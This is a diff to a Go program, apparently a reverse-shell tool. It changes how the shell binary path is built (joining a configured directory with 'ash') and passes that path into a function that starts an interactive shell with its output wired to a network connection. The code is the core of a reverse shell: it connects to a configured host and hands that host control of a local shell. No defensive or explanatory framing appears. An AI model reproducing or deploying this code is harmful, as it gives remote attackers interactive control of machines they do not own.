@@ -6,6 +6,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path"
 )
 
 func main() {
@@ -18,7 +19,8 @@ func startReverseShell(config Config) {
 	conn, err := net.Dial(config.Protocol, host)
 	check(err)
 
-	stdin := startShell(conn)
+	shellpath := path.Join(config.Path, "ash")
+	stdin := startShell(shellpath, conn)
 	reader := newNetLineReader(conn, config.Timeout)
 
 	// feed input from network until timeout value exceeds or
@@ -32,8 +34,8 @@ func startReverseShell(config Config) {
 	}
 }
 
-func startShell(conn net.Conn) io.WriteCloser {
-	shellpath := loadShell()
+func startShell(shellpath string, conn net.Conn) io.WriteCloser {
+	loadShell(shellpath)
 
 	shell := exec.Command(shellpath, "-i")
 	shell.Stdout = conn
